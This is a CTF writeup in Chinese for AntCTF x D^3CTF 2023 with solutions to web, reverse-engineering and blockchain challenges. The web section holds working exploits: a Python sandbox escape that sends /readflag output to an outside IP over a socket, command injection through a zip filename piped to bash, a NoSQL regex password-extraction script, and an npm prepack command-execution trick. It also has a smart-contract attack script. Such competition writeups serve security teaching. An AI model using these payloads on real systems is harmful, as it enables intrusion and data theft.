# 2023 D^3CTF writeup by 万年三等奖

> 原文: https://www.ctfiot.com/113179.html
> ID: 113179

HEADER

由于预备队W4ntY0u成员也对本次比赛有高度兴趣，故安排其与主队一起以“万年三等奖”作为队名参加了AntCTF x D^3CTF，一方面是为了避免两队都有可能获奖的情况下占用了其他师傅们的获奖名额，另一方面也方便发现团队整体的薄弱之处，果然又在它酿的密码上！！！来点密码✌带带孩子们吧！！！

题目附件下载地址请后台回复：d3ctf2023

WEB

Escape Plan：

https://cn-sec.com/archives/1322842.html

调试 payload

import requests, base64u = '??????????'payload = b"""__import__('os').popen("python -c 'import socket, os; flag = os.popen(\"/readflag\").read().encode();host = \"43.143.195.203\";port=1337;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s.sendall(flag);s.close();a=1;'").read()"""payload = str(base64.b64encode(payload)).strip('b').strip("'") +"="print(payload)CMD = "ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::
len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::
len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::
len(list(dict(aa=()))[len([])])]](list(dict({}()))[len([])]))".format(payload)CMD = CMD.translate({ord(str(i)): u[i] for i in range(10)})r = requests.post("http://106.14.124.130:
31405/", data={"cmd": base64.b64encode(CMD.encode())}).textprint(r)

d3cloud：admin/admin 登录后台

插件发现 FilesystemAdapter.php，跟官方文件进行比对多了以下代码

public function putFileAs($path, $file, $name, $options = []){ $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt'); $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION)); if (!in_array($file_type, $supported_file)) { return false; } $stream = fopen($file->getRealPath(), 'r+'); $result = $this->put( $path = trim($path.'/'.$name, '/'), $stream, $options ); if (is_resource($stream)) { fclose($stream); } if($file->getClientOriginalExtension() === "zip") { $fs = popen("unzip -oq ". $this->driver->getAdapter()->getPathPrefix() . $name ." -d " . $this->driver->getAdapter()->getPathPrefix(),"w"); pclose($fs); } return $result ? $path : false; }

后缀不可控，上传 zip 文件自动解压，可操作的地方有两处：1.zip-slip 2.unzip 处命令注入，调试后发现 unzip 的命令如下

unzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/

修改文件名来命令注入如下

1;
echo Y2F0IC9mbDFBZyA+IC92YXIvd3d3L2h0bWwvcHVibGljL2ZsYWcudHh0|base64 -d|bash;.zip

d3node：nosql 注出密码

import requestsimport stringpassword=""url = 'http://106.14.124.130:
30407/user/LoginIndex'while True: for c in string.printable[:-6]: if c not in ['*', '+', '.', '?', '|', '#', '&', '$']: payload = { "username": "admin", "password[$regex]": '^' + password + c } r = requests.post(url=url, data=payload,allow_redirects=False) if r.status_code==302: password += c print(password)

根据 hint2 可以尝试任意文件读，绕过 app 黑名单

http://106.14.124.130:
31597/dashboardIndex/ShowExampleFile?filename[href]=a&filename[origin]=1&filename[protocol]=file:&filename[hostname]=&filename[pathname]=./%2561pp.js

PackDependencies 执行 npm pack，

SetDependencies 可以控制./public/package.json

修 改 package.json 添 加 prepack 命 令 执 行 ：http://106.14.124.130:
31597/dashboardIndex/SetDependencies

{ "name": "y0ng-test", "version": "1.0.0", "description": "Example app for the Node.js Getting Started guide.", "author": "anonymous", "scripts":{ "prepack":"ls > /tmp/y0" }, "license": "MIT"}

访问 /dashboardIndex/PackDependencies 执行 npm pack，再读一手 flag

REVERSE

d3sky：tls 存在反调试

分析汇编，存在除零异常。

可以通过 attach 绕过，边调试边记录程序对输入的处理。

s = "abcdefghijklmnopqrstuvwxyz0123456789~"s_arr = [ord(c) for c in s]# print(hex((~(s_arr[0] & s_arr[0])) & 0xffff)) # 0xff9e
# print(hex((~(s_arr[1] & 0xff9e)) & 0xffff)) # 0xfffd
# print(hex((~(s_arr[1] & s_arr[1])) & 0xffff)) # 0xff9d
# print(hex((~(s_arr[0] & 0xff9d)) & 0xffff)) # 0xfffe
# print(hex((~(0xfffd & 0xfffe)) & 0xffff)) # 0x3
# print(hex((~(s_arr[2] & s_arr[2])) & 0xffff)) # 0xff9c
# print(hex((~(s_arr[3] & 0xff9c)) & 0xffff)) # 0xfffb
# print(hex((~(s_arr[3] & s_arr[3])) & 0xffff)) # 0xff9b
# print(hex((~(s_arr[2] & 0xff9b)) & 0xffff)) # 0xfffc
# print(hex((~(0xfffb & 0xfffc)) & 0xffff)) # 0x7
# print(hex((~(0x3 & 0x3)) & 0xffff)) # 0xfffc
# print(hex((~(0x7 & 0xfffc)) & 0xffff)) # 0xfffb
# print(hex((~(0x7 & 0x7)) & 0xffff)) # 0xfff8
# print(hex((~(0x3 & 0xfff8)) & 0xffff)) # 0xffff
# print(hex((~(0xfffb & 0xffff)) & 0xffff)) # 0x4enc = [0x24, 0x0B, 0x6D, 0x0F, 0x03, 0x32, 0x42, 0x1D, 0x2B, 0x43, 0x78, 0x43, 0x73, 0x30, 0x2B, 0x4E, 0x63, 0x48, 0x77, 0x2E, 0x32, 0x39, 0x1A, 0x12, 0x71, 0x7A, 0x42, 0x17, 0x45, 0x72, 0x56, 0x0C, 0x5C, 0x4A, 0x62, 0x53, 0x33]# print(hex((~(enc[0] & enc[0])) & 0xffff)) # 0xffdb
# print(hex((~(0x4 & 0xffdb)) & 0xffff)) # 0xffff
# print(hex((~(0x4 & 0x4)) & 0xffff)) # 0xfffb
# print(hex((~(enc[0] & 0xfffb)) & 0xffff)) # 0xffdf
# print(hex((~(0xffff & 0xffdf)) & 0xffff)) # 0x20

实际效果为：

input[0]^input[1]^input[2]^input[3]==enc[0]input[1]^input[2]^input[3]^input[4]==enc[1]...input[36]^input[0]^input[1]^input[2]==enc[36]

将第一行和最后一行左右两边异或，得到：

input[36]^input[3]==enc[36]^enc[0]

而 input[36]为已知的 0x7E，于是便可得到 input[3]，其他 input 依此类推，脚本如下：

enc = [0x24, 0x0B, 0x6D, 0x0F, 0x03, 0x32, 0x42, 0x1D, 0x2B, 0x43, 0x78, 0x43, 0x73, 0x30, 0x2B, 0x4E, 0x63, 0x48, 0x77, 0x2E, 0x32, 0x39, 0x1A, 0x12, 0x71, 0x7A, 0x42, 0x17, 0x45, 0x72, 0x56, 0x0C, 0x5C, 0x4A, 0x62, 0x53, 0x33]flag = [0] * len(enc)flag[len(flag)-1] = 0x7Eidx = len(flag)-1while b"x00" in bytes(flag): next_idx = (idx+4) % len(flag) flag[next_idx] = flag[idx] ^ enc[idx] ^ enc[(next_idx-3) % 37] idx = next_idxprint(b"antd3ctf{"+bytes(flag)+b"}")
# antd3ctf{A_Sin91e_InS7rUcti0N_ViRTua1_M4chin3~}

d3Tetris：

pcap|http+pb1: 12: "246b.b367z303\k365tDm212366262244204D360367216241320335t306b'bt351"3: "3d354e98963a69b2"4: 605: 16809369627306: 2

Java_com_jetgame_tetris_logic_GameViewModel_oO0OooOo0oO字符串都加密了，纯静态分析可以写个 unicorn 脚本提取

aes_init((__int64)aes_ctx, 2u); v148 = (uint8_t *)_emutls_get_address((__int64)&unk_4A140); // addr: 0004A140 // 00000000: 41 20 53 49 4D 50 4C 45 20 4B 45 59 21 21 21 21 A SIMPLE KEY!!!! // 00000010: 21 21 21 21 21 21 21 21 21 21 21 21 21 21 21 21 !!!!!!!!!!!!!!!! // 00000020: 54 00 T. // data: b'A SIMPLE KEY!!!!!!!!!!!!!!!!!!!!Tx00' v149 = (char *)aes((unsigned int *)aes_ctx, s, 0x30u, v148, (__int64)iv); nullsub_1(&rc4_ctx); // addr: 0004A500 // 00000000: 53 4B 4A 3C 48 41 4E 49 4F 53 48 44 4C 4A 4B 61 SKJ<HANIOSHDLJKa // 00000010: 00 . // data: b'SKJ<HANIOSHDLJKax00' if... v150 = (char *)_emutls_get_address((__int64)&unk_4A500); sub_173B8((__int64)v150); // SKJ<HANIOSHDLJKa v151 = __strlen_chk(v150, 18u); rc4_init(&rc4_ctx, v150, v151); v152 = (jbyte *)malloc(0x21u); rc4_crypto(&rc4_ctx, v149, v152, 0x20); v153 = (*a1)->NewByteArray(a1, 0x20LL); (*a1)->SetByteArrayRegion(a1, v153, 0LL, 0x20LL, v152);

aes256+rc4

# 求逆 sboxsbox = [ 0x90, 0x7A, 0x50, 0xEF, 0xF0, 0x9C, 0x2F, 0x7D, 0xA0, 0x34, 0x23, 0xCA, 0x4F, 0x21, 0x66, 0x6B, 0x3D, 0xE0, 0xC2, 0xB3, 0xFC, 0x69, 0x08, 0xFF, 0x7F, 0x16, 0x48, 0xD5, 0xEB, 0x59, 0xD8, 0x0C, 0xF3, 0xE4, 0xA8, 0xEA, 0xB9, 0x81, 0x01, 0x28, 0x13, 0xB8, 0x6C, 0xCB, 0xDC, 0x8A, 0x27, 0x19, 0xD2, 0xA4, 0xD3, 0x99, 0x49, 0x57, 0x87, 0xDF, 0x2D, 0x4A, 0xC1, 0x58, 0xB4, 0x68, 0xDE, 0xC7, 0x94, 0x7B, 0xAA, 0xE2, 0x8C, 0x53, 0xAD, 0x1E, 0x04, 0xC5, 0x18, 0x00, 0xED, 0xF1, 0x79, 0x43, 0x51, 0xB0, 0x84, 0x5A, 0xEE, 0x97, 0x88, 0x26, 0xB6, 0x73, 0x9D, 0x5B, 0xFE, 0xE5, 0x54, 0xF4, 0xB1, 0x06, 0x3F, 0xBC, 0x31, 0x60, 0xA1, 0x85, 0xC9, 0xF8, 0xC6, 0xE7, 0xAE, 0xC3, 0x82, 0x9F, 0xFB, 0xCE, 0xFD, 0x32, 0x8D, 0x2E, 0x41, 0xBF, 0x37, 0xB7, 0xEC, 0x77, 0x02, 0x80, 0x3B, 0x76, 0x92, 0x14, 0xD0, 0x4C, 0x38, 0x89, 0x1C, 0x46, 0x2B, 0x0B, 0xC4, 0x72, 0x0E, 0xCD, 0x62, 0x10, 0x6F, 0x09, 0x8F, 0x7C, 0xD4, 0xD7, 0x6D, 0xF7, 0x9B, 0xAC, 0x20, 0x12, 0x64, 0xDD, 0xCC, 0xFA, 0x70, 0xF9, 0x35, 0x1D, 0x9A, 0x52, 0xF5, 0x0D, 0xAF, 0xBA, 0xA6, 0x30, 0x29, 0x8B, 0x7E, 0xC0, 0x83, 0x95, 0x61, 0x44, 0xA3, 0x22, 0x75, 0x5E, 0xA7, 0x55, 0x2A, 0x91, 0xF2, 0x42, 0xA2, 0x56, 0xB5, 0x5F, 0xDB, 0x36, 0x47, 0xBE, 0x86, 0xA5, 0x40, 0x15, 0x5D, 0x8E, 0xBD, 0xC8, 0x1A, 0xD1, 0x3C, 0x07, 0x11, 0x33, 0xBB, 0x6E, 0x9E, 0x96, 0x3A, 0xDA, 0x39, 0x5C, 0x2C, 0x1F, 0x17, 0xE6, 0x25, 0x6A, 0x0A, 0x3E, 0x93, 0xE9, 0x74, 0x65, 0xAB, 0x4D, 0xCF, 0xE8, 0x78, 0x0F, 0xB2, 0xE1, 0xF6, 0x71, 0x03, 0xA9, 0x1B, 0xD6, 0x63, 0x4E, 0xD9, 0x24, 0x98, 0x67, 0x45, 0x05, 0xE3, 0x4B]rsbox = [0]*0x100for i in range(0x100): rsbox[i] = sbox.index(i)print(rsbox)

from Crypto.Cipher.ARC4 import ARC4Ciphercipher = ARC4Cipher(b'SKJ<HANIOSHDLJKa')aesct = cipher.decrypt(bytes.fromhex('a6622e62f77ac35c6bf574446d8af6b2a48444f0f78ea1d0dd09c662270874e9'))print(aesct.hex()) # 43a7e60d237e472964b3b98e08f76cce938078a61bc23b32653865e3af2dfff9

轮秘钥加 inline 了

static const uint8_t rsbox[256] = { 75, 38, 124, 242, 72, 253, 97, 209, 22, 145, 226, 137, 31, 167, 140, 237, 143, 210, 155, 40, 129, 201, 25, 222, 74, 47, 206, 244, 134, 163, 71, 221, 154, 13, 181, 10, 249, 224, 87, 46, 39, 172, 186, 136, 220, 56, 117, 6, 171, 100, 115, 211, 9, 162, 195, 120, 132, 218, 216, 126, 208, 16, 227, 98, 200, 118, 189, 79, 179, 252, 135, 196, 26, 52, 57, 255, 131, 233, 247, 12, 2, 80, 165, 69, 94, 185, 191, 53, 59, 29, 83, 91, 219, 202, 183, 193, 101, 178, 142, 246, 156, 231, 14, 251, 61, 21, 225, 15, 42, 150, 213, 144, 160, 241, 139, 89, 230, 182, 127, 123, 236, 78, 1, 65, 147, 7, 174, 24, 125, 37, 110, 176, 82, 103, 198, 54, 86, 133, 45, 173, 68, 116, 203, 146, 0, 187, 128, 228, 64, 177, 215, 85, 250, 51, 164, 152, 5, 90, 214, 111, 8, 102, 190, 180, 49, 199, 170, 184, 34, 243, 66, 232, 153, 70, 108, 168, 81, 96, 238, 19, 60, 192, 88, 121, 41, 36, 169, 212, 99, 204, 197, 119, 175, 58, 18, 109, 138, 73, 106, 63, 205, 104, 11, 43, 158, 141, 113, 234, 130, 207, 48, 50, 148, 27, 245, 149, 30, 248, 217, 194, 44, 157, 62, 55, 17, 239, 67, 254, 33, 93, 223, 107, 235, 229, 35, 28, 122, 76, 84, 3, 4, 77, 188, 32, 95, 166, 240, 151, 105, 161, 159, 112, 20, 114, 92, 23};
static void Cipher(state_t *state, const uint8_t *RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(0, state, RoundKey); // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without MixColumns() for (round = 1;; ++round) { SubBytes(state); // ShiftRows(state); if (round == Nr) { break; } MixColumns(state); // 魔改+ShiftRows ShiftRows(state); AddRoundKey(round, state, RoundKey); } // 魔改+ShiftRows ShiftRows(state); // Add round key to last round AddRoundKey(Nr, state, RoundKey);}static void InvCipher(state_t *state, const uint8_t *RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(Nr, state, RoundKey); InvShiftRows(state); // 魔改+ // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without InvMixColumn() for (round = (Nr - 1);; --round) { // InvShiftRows(state); // 魔改- InvSubBytes(state); AddRoundKey(round, state, RoundKey); if (round != 0) { InvShiftRows(state); // 魔改+ } if (round == 0) { break; } InvMixColumns(state); }}unsigned char hexData[32] = {0x43, 0xA7, 0xE6, 0x0D, 0x23, 0x7E, 0x47, 0x29, 0x64, 0xB3, 0xB9, 0x8E, 0x08, 0xF7, 0x6C, 0xCE, 0x93, 0x80, 0x78, 0xA6, 0x1B, 0xC2, 0x3B, 0x32, 0x65, 0x38, 0x65, 0xE3, 0xAF, 0x2D, 0xFF, 0xF9};
int main() { struct AES_ctx ctx; // AES_init_ctx_iv(&ctx, (const uint8_t *)"A SIMPLE KEY!!!!!!!!!!!!!!!!!!!!T", // (const uint8_t *)"3d354e98963a69b2"); // AES_CBC_encrypt_buffer(&ctx, hexData, 32); AES_init_ctx_iv(&ctx, (const uint8_t *)"A SIMPLE KEY!!!!!!!!!!!!!!!!!!!!T", (const uint8_t *)"3d354e98963a69b2"); AES_CBC_decrypt_buffer(&ctx, hexData, 32); DumpHex(hexData, 32); printf("%sn", hexData); return 0;}// dd4ee7c9-031c-4073-bba5-a3efa8fe+????

解出来的bootld少了四个字符：

【管理员】d3Tetris-0wl 2023/4/29 8:33:
44d3Tetris 解出的 flag 最后请加上 "65bd" 提交，附件之后会更新

d3Hell：对 dll dump 发现其主要的逻辑是替换主程序的一些常量(flag, re_table)和反调试

a1 = 32; v5 = (uint8_t *)0x401F13; // sleep(200)的位置 for ( i = 0; i <= 13; ++i ) { if ( v5[i] != code[i] ) { v9 = 1; break; } } if ( !IsDebuggerPresent() && !v9 ) { a2[0] = 0xA532267E; a2[1] = 0x8EFB0F27; v3[0] = 0x3C5F791A; v3[1] = 0x1A38CC77; for ( i = 0; i <= 39; ++i ) re_table[i] = 0; }

不去修改 sleep 那边的代码就行了

// 质因数个数 stru_4099F0.m128i_i64[0] = 0i64; stru_4099F0.m128i_i64[1] = 0i64; a1 = BN; a2 = 120ui64; // 分解质因数 factor(&a1, (__m128i *)&a2); // yafu-x64.exe factor(698740305822331500978964939673142241) // P18 = 768614336404564651 // P18 = 909090909090909091 v4 = stru_4099F0.m128i_i64[1]; a1.m128i_i64[0] = stru_4099F0.m128i_i64[0]; a1.m128i_i64[1] = v4; // 排序质因数 从小到大 sorted(xmmword_409AA0, &xmmword_409AA0[stru_4099F0.m128i_i64[0]], &a1); stru_409A00[0].m128i_i64[0] = 1i64; stru_409A00[0].m128i_i64[1] = 0i64; v15 = (__m128i)1ui64; // // 应该是去重 for ( i = 1ui64; i < (__int128)__PAIR128__(stru_4099F0.m128i_i64[1], stru_4099F0.m128i_u64[0]); i += 1ui64 ) { if ( *(_OWORD *)&xmmword_409AA0[i] == *(_OWORD *)&xmmword_409AA0[i - 1] ) { stru_409A00[v15.m128i_i64[0] - 1] = (__m128i)(*(_OWORD *)&stru_409A00[v15.m128i_i64[0] - 1] + 1i64); } else { v5 = &stru_409A00[v15.m128i_i64[0]]; v5->m128i_i64[0] = 1i64; v5->m128i_i64[1] = 0i64; *(__m128i *)&v6 = v15; *(_OWORD *)&v15 += 1ui64; v7 = &xmmword_409AA0[i]; v8 = v7->m128i_i64[1]; v6 = &xmmword_409AA0[(_QWORD)v6]; v6->m128i_i64[0] = v7->m128i_i64[0]; v6->m128i_i64[1] = v8; } } xmmword_4099A0 = v15; for ( i = 0ui64; i < (__int128)__PAIR128__(xmmword_4099A0.m128i_i64[1], xmmword_4099A0.m128i_u64[0]); i += 1ui64 ) { v9 = &xmmword_409AA0[i]; v10 = v9->m128i_i64[1]; a1.m128i_i64[0] = v9->m128i_i64[0]; a1.m128i_i64[1] = v10; BN_2_str(&a1); } for ( i = 0ui64; i <= 39; i += 1ui64 ) g_real_flag[i] ^= g_re_talbe[i]; // antd3ctf{768614336404564651909090909090909091} printf("antd3ctf{%s}n", g_real_flag);

算法故意写的效率很慢，较大的数值跑不出来，尝试降低输入数值的数量级，比如把输入改成 240 让程序可以正常执行，然后观察输入输出，就可以推测出各个函数大致的作用了。

d3rc4：init_array 修改 rc4 密钥，并且更正 wrong 和 right 字符串

main 函数进行一次 rc4 加密，不过得到的是假 flag。

fini_array 还存在对输入的处理。

调试，修改标志位，使得程序自行完成 rc4 加密的初始化，取出 xor_box 的数据最后写逆向脚本即可得到 flag

s = "abcdefghijklmnopqrstuvwxyz0123456789"s_arr = [ord(c) for c in s]s_enc = [0xD9, 0xE4, 0x27, 0x07, 0xD0, 0xBE, 0x7B, 0xFD, 0xB8, 0x14, 0x1B, 0x32, 0xD1, 0x38, 0x0C, 0x44, 0x59, 0xE2, 0x66, 0x8C, 0x38, 0x24, 0xEA, 0x66, 0x8C, 0x65, 0xF8, 0x55, 0x60, 0x28, 0x50, 0x3A, 0x12, 0xA4, 0x78, 0x64]xor_box_1 = []for i in range(len(s_arr)): xor_box_1.append(s_arr[i] ^ s_enc[i])xor_box_2 = [0x35, 0x4B, 0xA0, 0x60, 0x08, 0x50, 0xA5, 0xF1, 0x33, 0x97, 0xB2, 0x13, 0xCB, 0x4C, 0x0D, 0xCF, 0xA3, 0x7C, 0x57, 0x53, 0xE2, 0xA9, 0x65, 0x4E, 0x0E, 0xC7, 0x7A, 0x0F, 0xFD, 0xB5, 0x9E, 0xB4, 0x33, 0xF9, 0x61, 0xD3]enc = [0xF7, 0x5F, 0xE7, 0xB0, 0x9A, 0xB4, 0xE0, 0xE7, 0x9E, 0x05, 0xFE, 0xD8, 0x35, 0x5C, 0x72, 0xE0, 0x86, 0xDE, 0x73, 0x9F, 0x9A, 0xF6, 0x0D, 0xDC, 0xC8, 0x4F, 0xC2, 0xA4, 0x7A, 0xB5, 0xE3, 0xCD, 0x60, 0x9D, 0x04, 0x1F]for i in range(0, len(enc), 2): enc[i+1] ^= xor_box_2[i+1] enc[i+1] = enc[i]-enc[i+1] enc[i+1] %= 0x100 enc[i] ^= xor_box_2[i] enc[i] = enc[i]-enc[i+1] enc[i] %= 0x100for i in range(len(enc)): enc[i] ^= xor_box_1[i]print(b"antd3ctf{"+bytes(enc)+b"}")
# antd3ctf{getting_primes_with_pipes_is_awesome}

d3syscall：通过系统调用实现的 VM

from claripy import *from libnum import n2stmp_buf = [BVS(b'enc_tmp', 8) for i in range(36)]flag = tmp_buf[:]enc_flag = [0]*6enc_flag[0] = 0xB0800699CB89CC89enc_flag[1] = 0x4764FD523FA00B19enc_flag[2] = 0x396A7E6DF099D700enc_flag[3] = 0xB115D56BCDEAF50Aenc_flag[4] = 0x2521513C985791F4enc_flag[5] = 0x0B03C06AF93AD0BEtmp_regs = [BVV(0, 64) for i in range(4)]tmp_stack = [BVV(0, 64) for i in range(40)]flag = [BVS(f'flag{i}', 64) for i in range(6)]sp = 0
def FN_335_set_reg(a1=0, dst=0, src=0): if a1 == 1: tmp_regs[dst] = src elif a1 == 0: tmp_regs[dst] = tmp_regs[src]def FN_336_alu(fun_id=0, dst=0, src=0): match fun_id: case 0: tmp_regs[dst] += tmp_regs[src] case 1: tmp_regs[dst] -= tmp_regs[src] case 2: tmp_regs[dst] *= tmp_regs[src] case 3: tmp_regs[dst] ^= tmp_regs[src] case 4: tmp_regs[dst] <<= tmp_regs[src] case 4: tmp_regs[dst] = tmp_regs[dst].LShR(tmp_regs[src])def FN_337_push(a1=0, src=0): global sp sp += 1 dst = sp if a1 == 1: tmp_stack[dst] = src elif a1 == 0: tmp_stack[dst] = tmp_regs[src]def FN_338_pop(dst=0): global sp sp = sp value = tmp_stack[sp] sp = sp-1 tmp_regs[dst] = value
def FN_339_clear_regs(): tmp_regs[0] = 0 tmp_regs[1] = 0 tmp_regs[2] = 0 tmp_regs[3] = 0
def x_syscall(sysno, a1=0, a2=0, a3=0, a4=0): match sysno: case 335: FN_335_set_reg(a1, a2, a3) case 336: FN_336_alu(a1, a2, a3) case 337: FN_337_push(a1, a2) case 338: FN_338_pop(a1) case 339: FN_339_clear_regs() case _: print(sysno)def chal_13F5(part1, part2): x_syscall(335, 1, 0, part1) x_syscall(335, 1, 1, part2) x_syscall(337, 0, 1) x_syscall(335, 0, 2, 0) x_syscall(335, 1, 1, 3) x_syscall(336, 4, 2, 1) x_syscall(335, 1, 1, 0x51E7647E) x_syscall(336, 0, 2, 1) x_syscall(335, 0, 3, 0) x_syscall(335, 1, 1, 3) x_syscall(336, 2, 3, 1) x_syscall(335, 1, 1, 0xE0B4140A) x_syscall(336, 0, 3, 1) x_syscall(336, 3, 2, 3) x_syscall(335, 0, 3, 0) x_syscall(335, 1, 1, 0xE6978F27) x_syscall(336, 0, 3, 1) x_syscall(336, 3, 2, 3) x_syscall(338, 1) x_syscall(336, 0, 1, 2) x_syscall(337, 0, 1) x_syscall(337, 0, 0) x_syscall(335, 0, 2, 1) x_syscall(335, 1, 0, 6) x_syscall(336, 4, 2, 0) x_syscall(335, 1, 0, 0x53A35337) x_syscall(336, 0, 2, 0) x_syscall(335, 0, 3, 1) x_syscall(335, 1, 0, 5) x_syscall(336, 2, 3, 0) x_syscall(335, 1, 0, 0x9840294D) x_syscall(336, 0, 3, 0) x_syscall(336, 3, 2, 3) x_syscall(335, 0, 3, 1) x_syscall(335, 1, 0, 0x5EAE4751) x_syscall(336, 1, 3, 0) x_syscall(336, 3, 2, 3) x_syscall(338, 0) x_syscall(336, 0, 0, 2) x_syscall(337, 0, 0) x_syscall(339, 0)chal_13F5(flag[0], flag[1])chal_13F5(flag[2], flag[3])chal_13F5(flag[4], flag[5])solver = Solver()for i in range(6): solver.add(enc_flag[i] == tmp_stack[i+1])_flag = b''for x in solver.batch_eval(flag, 2): for i in x: _flag += (n2s(i)[::-1]) print(_flag)
# d3ctf{cef9b994-2547-4844-ac0d-a097b75806a0}

d3recover：题目提供了带符号的版本，可以直接用`bindiff`恢复 ver1 的符号

for ( i = 0LL; i <= 31; ++i ) { Item = _Pyx_PyInt_From_long(i); if... v23 = v10; v10 = Item; Py_XDECREF(v23); Item = _Pyx_PyObject_GetItem(a2, Item); if... if ( (unsigned int)PyType_HasFeature(*(_QWORD *)(Item + 8), 0x10000000LL) ) v2 = (unsigned int)sub_5A374B(Item); else v2 = sub_5A3D44(Item); v24 = v2; if... Py_DECREF(Item); Item = 0LL; if ( (unsigned int)_Pyx_PyByteArray_Append(v9, v24 ^ 0x23u) == -1 ) { v18 = off_A7A208; v6 = 34; v7 = 2138; goto LABEL_60; } } for ( j = 0LL; j <= 29; ++j ) { Item = _Pyx_PyInt_From_long(j); if... v22 = v10; v10 = Item; Py_XDECREF(v22); Item = _Pyx_PyObject_GetItem(v9, Item); if... v16 = _Pyx_PyInt_AddObjC(v10, qword_ABC1E8, 2LL, 0LL, 0LL); if... v17 = _Pyx_PyObject_GetItem(v9, v16); if... Py_DECREF(v16); v16 = PyNumber_Add(Item, v17); if... Py_DECREF(Item); Item = 0LL; Py_DECREF(v17); v17 = _Pyx_PyInt_AndObjC(v16, qword_ABC220, 255LL, 0LL, 0LL); if... Py_DECREF(v16); v16 = _Pyx_PyInt_XorObjC(v17, qword_ABC218, 84LL, 0LL, 0LL); if... Py_DECREF(v17); v17 = 0LL; if ( (int)PyObject_SetItem(v9, v10, v16) < 0 ) { v18 = off_A7A208; v6 = 36; v7 = 2178; goto LABEL_60; } Py_DECREF(v16); v16 = 0LL; }

from claripy import *from Crypto.Cipher.ARC4 import ARC4Ciphertmp_buf = [BVS(b'enc_tmp', 8) for i in range(32)]flag = tmp_buf[:]enc_flag = bytes.fromhex( 'd3c7ceca3f84dbb3b6b980ead0cd72fcd83095dbe2d89208c1c6c5f407ec025e')for j in range(32): tmp_buf[j] ^= 0x23for j in range(30): tmp_buf[j] = ((tmp_buf[j] + tmp_buf[j+2]) & 0xFF) ^ 0x54solver = Solver()for i in range(32): solver.add(enc_flag[i] == tmp_buf[i]) # solver.add(flag[i] >= 32) # solver.add(flag[i] <= 127)for x in solver.batch_eval(flag, 50): b = bytes(x) print(b) print(b.hex())
# b'flag{y0U_RE_Ma5t3r_0f_R3vocery!}'

MISC

d3casino：题目有以下要求:

msg.sender 要是个 < 100 bytes 的合约要返回正确的 rand要使得 msg.sender 的 address 和 tx.origin 的 address 有相同的 00 byte 位

解决方法

- assembly / opcode 直接写合约- rand 依赖 block.timestamp, block.difficulty, 在同一个 tx 中是不变的, 在攻击合约中同样可以计算- 用私钥凑 tx.origin 的地址 ([bokub/vanity-eth: Browser-based ETH vanity address generator (github.com)](https://github.com/bokub/vanity-eth)), 用 create2 凑攻击合约的地址, 凑前两位是 00 00, 总共重复攻击 5 次

相关脚本:
攻击合约, 正常 solidity 编译

contract Attack {address public exp;event Deployed(address x);function deploy(bytes memory bytecode, bytes32 salt) public returns (address addr) {assembly {addr := create2(0, add(bytecode, 32), mload(bytecode), salt)if iszero(extcodesize(addr)) { revert(0, 0) }}emit Deployed(addr);
return addr;}function deploy_exp(bytes32 salt, address casino_addr) public {bytes memory exp_code_pre = hex"6059600d60003960596000f3fe600036111560385773";bytes memory exp_code_post = hex"60006311610c2581526020816004601c84016000865af1600080f35b42600052306034524460205260546000206011810690508060005260206000f3";bytes memory exp_code = abi.encodePacked(exp_code_pre, bytes20(casino_addr), exp_code_post);exp = deploy(exp_code, salt);casino = D3Casino(casino_addr);}function attack() public {(bool success,) = exp.call("0x");}}

用来调用 bet 的 合 约 , 用 solc –assemble –bin xxx.yul 编 译 , rand 计 算 需 注 意encodePacked 的排布

object "Exp" { code { // Deploy the contract datacopy(0, dataoffset("runtime"), datasize("runtime")) return(0, datasize("runtime")) } object "runtime" { code { if gt(calldatasize(), 0) { // call bet let addr := 0x348fab138Ec760eBd0A7751225E6F632C6f5715f let x := 0 mstore(x, 0x11610c25) let success := call(gas(), addr, 0, add(x, 28), 4, x, 0x20) return(0, 0) } // test calc rand mstore(0, timestamp()) mstore(52, address()) mstore(32, difficulty()) let rand := keccak256(0, 84) rand := mod(rand, 17) // return rand mstore(0, rand) return(0, 0x20) } }}

攻击脚本，用hardhat：

const { ethers } = require('hardhat');function calc_salt(addr, casino_addr, from=0, count=5) { var salt = BigInt(from); var target_code = "0x" + "6059600d60003960596000f3fe600036111560385773" + casino_addr.slice(2) + "60006311610c2581526020816004601c84016000865af1600080f35b42600052306034524460205260546000206011810690508060005260206000f3"; var cnt = 0; var res = Array(count).fill(0); while (true) { var salt_str = "0x" + salt.toString(16).padStart(64, '0'); create_addr = ethers.utils.solidityKeccak256( ['bytes1', 'address', 'bytes32', 'bytes32'], ['0xff', addr, salt_str, ethers.utils.solidityKeccak256(['bytes'], [target_code])] ).slice(26); if (create_addr.startsWith('0000')) { console.log('find salt:', salt_str); console.log('create_addr:', create_addr); res[cnt] = salt_str; cnt += 1; if (cnt == count) { break; } } salt++; } return res;}describe('Test', function() { it('D3', async function() { const D3 = await ethers.getContractFactory('D3Casino'); const Attack = await ethers.getContractFactory('Attack'); const casino_addr = '0x1ac02a58e9e8fC1031EC713a23F8D2491df98fEd'; const attack = await Attack.deploy(); await attack.deployed(); const d3 = D3.attach(casino_addr); console.log('attack', attack.address); console.log('exp', await attack.exp()); const [owner] = await ethers.getSigners(); console.log('owner', owner.address); console.log('balance', ethers.utils.formatEther(await ethers.provider.getBalance(owner.address))); console.log('d3', d3.address); console.log('scores', await d3.scores(owner.address)); var salt_arr = calc_salt(attack.address, d3.address); for (var i = 0; i < salt_arr.length; i++) { console.log('salt', salt_arr[i]); await attack.deploy_exp(salt_arr[i], d3.address, {gasLimit: 3000000}); await new Promise(r => setTimeout(r, 10000)); var exp_addr = await attack.exp(); console.log('exp_addr', exp_addr); await attack.attack({gasLimit: 3000000}); await new Promise(r => setTimeout(r, 10000)); var betrecord = await d3.betrecord(exp_addr); console.log('betrecord', betrecord); var scores = await 